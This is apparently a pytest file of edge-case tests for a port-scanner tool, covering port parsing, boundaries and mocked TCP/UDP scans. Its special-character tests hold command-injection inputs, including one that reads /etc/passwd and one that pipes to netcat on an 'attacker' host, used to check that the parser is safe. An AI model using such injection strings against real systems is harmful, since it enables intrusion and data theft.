#!/usr/bin/env python3
"""
Edge Case Tests for Port Scanner
=================================

Comprehensive edge case testing for the port-scanner tool including:
- Empty inputs
- Malformed port specifications
- All port range formats
- Service detection edge cases
- Boundary conditions
- Unicode/special characters

Author: QA Tester Agent
Date: January 10, 2026
"""

import pytest
import sys
import socket
from unittest.mock import patch, MagicMock
from datetime import datetime

# Add the tools directory to path for imports
sys.path.insert(0, '/Users/ic/cptc11/python/tools/port-scanner')

from tool import (
    PortState,
    ScanType,
    PortResult,
    ScanConfig,
    ScanReport,
    TCPConnectScan,
    TCPSYNScan,
    UDPScan,
    PortScanner,
    get_documentation,
    print_plan,
    parse_arguments,
    parse_port_specification,
    get_service_name,
    TOP_20_PORTS,
    TOP_100_PORTS,
    SERVICE_PORTS,
)


# =============================================================================
# Empty Input Tests
# =============================================================================

class TestEmptyInputs:
    """Tests for handling empty inputs."""

    def test_empty_port_specification(self):
        """Empty port specification should return empty list."""
        ports = parse_port_specification("")
        assert ports == []

    def test_whitespace_port_specification(self):
        """Whitespace-only port specification should return empty list."""
        ports = parse_port_specification("   ")
        assert ports == []

    def test_empty_target(self):
        """Empty target should be handled gracefully."""
        config = ScanConfig(target="", ports=[80])
        scanner = PortScanner(config)
        # Should not crash, but scan will fail to resolve

    def test_empty_ports_list(self):
        """Empty ports list should not crash."""
        config = ScanConfig(target="192.168.1.1", ports=[])
        scanner = PortScanner(config)
        assert scanner.config.ports == []


# =============================================================================
# Port Specification Parsing Tests
# =============================================================================

class TestPortSpecificationParsing:
    """Tests for port specification parsing edge cases."""

    @pytest.mark.parametrize("valid_spec,expected_count", [
        ("80", 1),
        ("22,80,443", 3),
        ("1-10", 10),
        ("1-5,10-15", 11),
        ("80,443,8000-8005", 8),
        ("top20", 20),
        ("top100", len(TOP_100_PORTS)),
        ("TOP20", 20),
        ("Top100", len(TOP_100_PORTS)),
    ])
    def test_valid_port_specifications(self, valid_spec, expected_count):
        """Valid port specifications should parse correctly."""
        ports = parse_port_specification(valid_spec)
        assert len(ports) == expected_count

    @pytest.mark.parametrize("invalid_spec", [
        "abc",                  # Non-numeric
        "22,abc,443",           # Mixed invalid
        "22-abc",               # Non-numeric range end
        "abc-80",               # Non-numeric range start
        "22.5",                 # Float
        "22e3",                 # Scientific notation
        "0x50",                 # Hex notation
        "--",                   # Double dash only
        ",-,",                  # Comma dash comma
        "22--80",               # Double dash
        "22-",                  # Trailing dash
        "-22",                  # Leading dash
    ])
    def test_invalid_port_specifications(self, invalid_spec):
        """Invalid port specifications should be handled gracefully."""
        try:
            ports = parse_port_specification(invalid_spec)
            # May return empty list or partial results
            for port in ports:
                assert 1 <= port <= 65535, f"Invalid port {port} from {invalid_spec}"
        except (ValueError, TypeError):
            pass  # Acceptable

    def test_port_specification_deduplication(self):
        """Duplicate ports should be removed."""
        ports = parse_port_specification("80,80,80,443,443")
        assert len(ports) == 2
        assert 80 in ports
        assert 443 in ports

    def test_port_specification_sorting(self):
        """Ports should be returned sorted."""
        ports = parse_port_specification("443,22,80")
        assert ports == sorted(ports)

    def test_overlapping_ranges(self):
        """Overlapping ranges should be deduplicated."""
        ports = parse_port_specification("1-100,50-150")
        assert len(ports) == 150
        assert min(ports) == 1
        assert max(ports) == 150

    def test_all_keyword(self):
        """'all' keyword should return all 65535 ports."""
        ports = parse_port_specification("all")
        assert len(ports) == 65535
        assert min(ports) == 1
        assert max(ports) == 65535


# =============================================================================
# Boundary Condition Tests
# =============================================================================

class TestBoundaryConditions:
    """Tests for boundary conditions."""

    @pytest.mark.parametrize("boundary_port", [1, 2, 1023, 1024, 32767, 32768, 65534, 65535])
    def test_boundary_port_values(self, boundary_port):
        """Boundary port values should be accepted."""
        ports = parse_port_specification(str(boundary_port))
        assert boundary_port in ports

    @pytest.mark.parametrize("invalid_port", [0, -1, -65535, 65536, 65537, 100000, 999999])
    def test_out_of_range_ports(self, invalid_port):
        """Out of range ports should be rejected."""
        ports = parse_port_specification(str(invalid_port))
        assert invalid_port not in ports

    def test_port_range_boundaries(self):
        """Port range at boundaries."""
        # Range including boundary
        ports = parse_port_specification("65530-65535")
        assert len(ports) == 6
        assert 65535 in ports

        # Range starting at 1
        ports = parse_port_specification("1-5")
        assert len(ports) == 5
        assert 1 in ports

    def test_range_exceeding_maximum(self):
        """Range exceeding maximum port should be truncated."""
        ports = parse_port_specification("65530-70000")
        assert max(ports) == 65535
        assert 70000 not in ports

    def test_timeout_boundaries(self):
        """Timeout boundary values."""
        config = ScanConfig(target="192.168.1.1", ports=[80], timeout=0.0)
        assert config.timeout == 0.0

        config = ScanConfig(target="192.168.1.1", ports=[80], timeout=0.001)
        assert config.timeout == 0.001

        config = ScanConfig(target="192.168.1.1", ports=[80], timeout=1000.0)
        assert config.timeout == 1000.0

    def test_thread_boundaries(self):
        """Thread count boundary values."""
        config = ScanConfig(target="192.168.1.1", ports=[80], threads=1)
        assert config.threads == 1

        config = ScanConfig(target="192.168.1.1", ports=[80], threads=1000)
        assert config.threads == 1000


# =============================================================================
# Service Detection Tests
# =============================================================================

class TestServiceDetection:
    """Tests for service detection functionality."""

    def test_known_service_ports(self):
        """Known service ports should return correct service names."""
        assert get_service_name(22) == "ssh"
        assert get_service_name(80) == "http"
        assert get_service_name(443) == "https"
        assert get_service_name(3306) == "mysql"
        assert get_service_name(5432) == "postgresql"

    def test_unknown_service_ports(self):
        """Unknown ports should return None."""
        assert get_service_name(12345) is None
        assert get_service_name(54321) is None
        assert get_service_name(99999) is None  # Also invalid

    def test_all_service_ports_mapped(self):
        """All ports in SERVICE_PORTS should return a service."""
        for port, service in SERVICE_PORTS.items():
            assert get_service_name(port) == service


# =============================================================================
# Unicode and Special Character Tests
# =============================================================================

class TestUnicodeAndSpecialCharacters:
    """Tests for Unicode and special characters in inputs."""

    @pytest.mark.parametrize("unicode_spec", [
        "\uff18\uff10",          # Full-width 80
        "\u0038\u0030",          # Unicode digits 80
        "80\u200b",              # Zero-width space
        "\u00a080",              # Non-breaking space
    ])
    def test_unicode_port_specification(self, unicode_spec):
        """Unicode port specifications should be handled gracefully."""
        try:
            ports = parse_port_specification(unicode_spec)
            # May return empty or handle unicode
        except (ValueError, TypeError, UnicodeError):
            pass  # Acceptable

    @pytest.mark.parametrize("special_target", [
        "192.168.1.1\x00",      # Null byte
        "192.168.1.1\r\n",      # CRLF
        "192.168.1.1;ls",       # Command injection
        "192.168.1.1|cat",      # Pipe
        "$(whoami)",            # Command substitution
        "`hostname`",           # Backtick execution
    ])
    def test_special_characters_in_target(self, special_target):
        """Special characters in target should be handled safely."""
        config = ScanConfig(target=special_target, ports=[80])
        # Config should accept, but scan may fail safely

    def test_port_spec_with_injection_attempt(self):
        """Port specification with injection attempts."""
        injection_specs = [
            "80; ls",
            "80 && cat /etc/passwd",
            "80 | nc attacker 4444",
            "$(whoami)",
            "80`id`",
        ]
        for spec in injection_specs:
            ports = parse_port_specification(spec)
            # Should not execute commands, may extract valid ports
            for port in ports:
                assert isinstance(port, int)
                assert 1 <= port <= 65535


# =============================================================================
# Large Input Tests
# =============================================================================

class TestLargeInputs:
    """Tests for handling large inputs."""

    def test_all_ports_scan(self):
        """Configuration with all 65535 ports."""
        config = ScanConfig(
            target="192.168.1.1",
            ports=list(range(1, 65536))
        )
        assert len(config.ports) == 65535

    def test_large_comma_separated_list(self):
        """Large comma-separated port list."""
        spec = ",".join(str(p) for p in range(1, 1001))
        ports = parse_port_specification(spec)
        assert len(ports) == 1000

    def test_many_ranges(self):
        """Many range specifications."""
        spec = ",".join(f"{i*100+1}-{i*100+50}" for i in range(10))
        ports = parse_port_specification(spec)
        assert len(ports) == 500  # 50 ports * 10 ranges


# =============================================================================
# PortResult Edge Cases
# =============================================================================

class TestPortResultEdgeCases:
    """Tests for PortResult edge cases."""

    def test_port_result_with_all_states(self):
        """PortResult with all possible states."""
        for state in PortState:
            result = PortResult(port=80, state=state)
            assert result.state == state
            result_dict = result.to_dict()
            assert result_dict["state"] == state.value

    def test_port_result_with_none_values(self):
        """PortResult with None optional values."""
        result = PortResult(port=80, state=PortState.OPEN)
        assert result.service is None
        assert result.banner is None
        assert result.response_time is None

    def test_port_result_with_long_banner(self):
        """PortResult with very long banner."""
        long_banner = "A" * 10000
        result = PortResult(
            port=80,
            state=PortState.OPEN,
            banner=long_banner
        )
        assert result.banner == long_banner

    def test_port_result_with_special_chars_in_banner(self):
        """PortResult with special characters in banner."""
        special_banner = "HTTP/1.1 200 OK\r\n\x00\xff\t\n"
        result = PortResult(
            port=80,
            state=PortState.OPEN,
            banner=special_banner
        )
        assert result.banner == special_banner


# =============================================================================
# ScanReport Edge Cases
# =============================================================================

class TestScanReportEdgeCases:
    """Tests for ScanReport edge cases."""

    def test_scan_report_empty_results(self):
        """ScanReport with no results."""
        report = ScanReport(target="192.168.1.1", results=[])
        assert report.get_open_ports() == []
        assert report.get_filtered_ports() == []

    def test_scan_report_all_open(self):
        """ScanReport with all open ports."""
        results = [PortResult(port=p, state=PortState.OPEN) for p in range(1, 11)]
        report = ScanReport(target="192.168.1.1", results=results)
        assert len(report.get_open_ports()) == 10
        assert len(report.get_filtered_ports()) == 0

    def test_scan_report_all_filtered(self):
        """ScanReport with all filtered ports."""
        results = [PortResult(port=p, state=PortState.FILTERED) for p in range(1, 11)]
        report = ScanReport(target="192.168.1.1", results=results)
        assert len(report.get_open_ports()) == 0
        assert len(report.get_filtered_ports()) == 10

    def test_scan_report_mixed_states(self):
        """ScanReport with mixed port states."""
        results = [
            PortResult(port=22, state=PortState.OPEN),
            PortResult(port=80, state=PortState.OPEN),
            PortResult(port=443, state=PortState.FILTERED),
            PortResult(port=8080, state=PortState.CLOSED),
            PortResult(port=8443, state=PortState.OPEN_FILTERED),
        ]
        report = ScanReport(target="192.168.1.1", results=results)
        assert len(report.get_open_ports()) == 2
        assert len(report.get_filtered_ports()) == 1


# =============================================================================
# Scan Type Tests
# =============================================================================

class TestScanTypes:
    """Tests for different scan types."""

    def test_all_scan_types_exist(self):
        """All scan types should be defined."""
        assert ScanType.TCP_CONNECT is not None
        assert ScanType.TCP_SYN is not None
        assert ScanType.UDP is not None
        assert ScanType.TCP_FIN is not None
        assert ScanType.TCP_NULL is not None
        assert ScanType.TCP_XMAS is not None

    def test_tcp_connect_scan_open_port(self):
        """TCP connect scan should detect open port."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.connect_ex.return_value = 0

            config = ScanConfig(target="192.168.1.1", ports=[80])
            technique = TCPConnectScan()
            result = technique.scan_port("192.168.1.1", 80, config)

            assert result.state == PortState.OPEN
            assert result.port == 80

    def test_tcp_connect_scan_closed_port(self):
        """TCP connect scan should detect closed port."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.connect_ex.return_value = 111

            config = ScanConfig(target="192.168.1.1", ports=[80])
            technique = TCPConnectScan()
            result = technique.scan_port("192.168.1.1", 80, config)

            assert result.state == PortState.CLOSED

    def test_tcp_connect_scan_filtered_port(self):
        """TCP connect scan should detect filtered port."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.connect_ex.side_effect = socket.timeout()

            config = ScanConfig(target="192.168.1.1", ports=[80])
            technique = TCPConnectScan()
            result = technique.scan_port("192.168.1.1", 80, config)

            assert result.state == PortState.FILTERED

    def test_udp_scan_open_port(self):
        """UDP scan should detect open port."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.recvfrom.return_value = (b"response", ("192.168.1.1", 53))

            config = ScanConfig(target="192.168.1.1", ports=[53])
            technique = UDPScan()
            result = technique.scan_port("192.168.1.1", 53, config)

            assert result.state == PortState.OPEN
            assert result.protocol == "udp"

    def test_udp_scan_open_filtered(self):
        """UDP scan should return open|filtered on timeout."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.recvfrom.side_effect = socket.timeout()

            config = ScanConfig(target="192.168.1.1", ports=[53])
            technique = UDPScan()
            result = technique.scan_port("192.168.1.1", 53, config)

            assert result.state == PortState.OPEN_FILTERED


# =============================================================================
# Banner Grabbing Tests
# =============================================================================

class TestBannerGrabbing:
    """Tests for banner grabbing functionality."""

    def test_banner_grab_http(self):
        """Banner grab should work for HTTP."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.connect_ex.return_value = 0
            mock_socket.return_value.recv.return_value = b"HTTP/1.1 200 OK\r\nServer: nginx\r\n\r\n"

            config = ScanConfig(
                target="192.168.1.1",
                ports=[80],
                banner_grab=True
            )
            technique = TCPConnectScan()
            result = technique.scan_port("192.168.1.1", 80, config)

            assert result.state == PortState.OPEN
            assert result.banner is not None or result.banner == ""  # May fail gracefully

    def test_banner_grab_timeout(self):
        """Banner grab should handle timeout gracefully."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.connect_ex.return_value = 0
            mock_socket.return_value.recv.side_effect = socket.timeout()

            config = ScanConfig(
                target="192.168.1.1",
                ports=[80],
                banner_grab=True
            )
            technique = TCPConnectScan()
            result = technique.scan_port("192.168.1.1", 80, config)

            # Port should still be detected as open
            assert result.state == PortState.OPEN


# =============================================================================
# Planning Mode Edge Cases
# =============================================================================

class TestPlanningModeEdgeCases:
    """Tests for planning mode edge cases."""

    def test_plan_mode_empty_ports(self, capsys):
        """Planning mode with empty ports."""
        config = ScanConfig(target="192.168.1.1", ports=[], plan_mode=True)
        print_plan(config)
        captured = capsys.readouterr()
        assert "[PLAN MODE]" in captured.out

    def test_plan_mode_large_port_list(self, capsys):
        """Planning mode with large port list."""
        config = ScanConfig(
            target="192.168.1.1",
            ports=list(range(1, 65536)),
            plan_mode=True
        )
        print_plan(config)
        captured = capsys.readouterr()
        assert "[PLAN MODE]" in captured.out
        assert "65535" in captured.out

    def test_plan_mode_unresolvable_target(self, capsys):
        """Planning mode with unresolvable target."""
        config = ScanConfig(
            target="nonexistent.invalid.host",
            ports=[80],
            plan_mode=True
        )
        print_plan(config)
        captured = capsys.readouterr()
        assert "[PLAN MODE]" in captured.out


# =============================================================================
# Socket Error Handling Tests
# =============================================================================

class TestSocketErrorHandling:
    """Tests for socket error handling."""

    @pytest.mark.parametrize("error_type", [
        socket.error("Connection error"),
        socket.timeout("Timeout"),
        socket.gaierror("Name resolution failed"),
        ConnectionRefusedError("Refused"),
        ConnectionResetError("Reset"),
        BrokenPipeError("Broken pipe"),
        OSError("OS error"),
    ])
    def test_tcp_scan_error_handling(self, error_type):
        """TCP scan should handle various socket errors."""
        with patch('socket.socket') as mock_socket:
            mock_socket.return_value.connect_ex.side_effect = error_type

            config = ScanConfig(target="192.168.1.1", ports=[80])
            technique = TCPConnectScan()
            result = technique.scan_port("192.168.1.1", 80, config)

            assert isinstance(result, PortResult)
            # Should not crash, state indicates failure


# =============================================================================
# PortScanner Class Tests
# =============================================================================

class TestPortScannerClass:
    """Tests for PortScanner class edge cases."""

    def test_scanner_stop_functionality(self):
        """Scanner stop should set stop event."""
        config = ScanConfig(target="192.168.1.1", ports=[80])
        scanner = PortScanner(config)
        scanner.stop()
        assert scanner._stop_event.is_set()

    def test_scanner_target_resolution_failure(self):
        """Scanner should handle resolution failure gracefully."""
        with patch('socket.gethostbyname') as mock_resolve:
            mock_resolve.side_effect = socket.gaierror("Name resolution failed")

            config = ScanConfig(target="nonexistent.host", ports=[80], verbose=True)
            scanner = PortScanner(config)
            report = scanner.scan()

            assert report.resolved_ip is None
            assert len(report.results) == 0

    def test_scanner_with_randomization(self):
        """Scanner port randomization should work."""
        config = ScanConfig(
            target="192.168.1.1",
            ports=list(range(1, 101)),
            randomize_ports=True
        )
        scanner = PortScanner(config)
        # Randomization happens during scan, not config


# =============================================================================
# Top Ports Tests
# =============================================================================

class TestTopPorts:
    """Tests for top ports functionality."""

    def test_top20_ports_count(self):
        """TOP_20_PORTS should have exactly 20 ports."""
        assert len(TOP_20_PORTS) == 20

    def test_top100_ports_count(self):
        """TOP_100_PORTS should have at least 90 ports."""
        assert len(TOP_100_PORTS) >= 90

    def test_top20_contains_common_ports(self):
        """TOP_20_PORTS should contain common ports."""
        common_ports = [22, 80, 443, 21, 25]
        for port in common_ports:
            assert port in TOP_20_PORTS

    def test_top_ports_are_valid(self):
        """All top ports should be valid port numbers."""
        for port in TOP_20_PORTS:
            assert 1 <= port <= 65535
        for port in TOP_100_PORTS:
            assert 1 <= port <= 65535


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
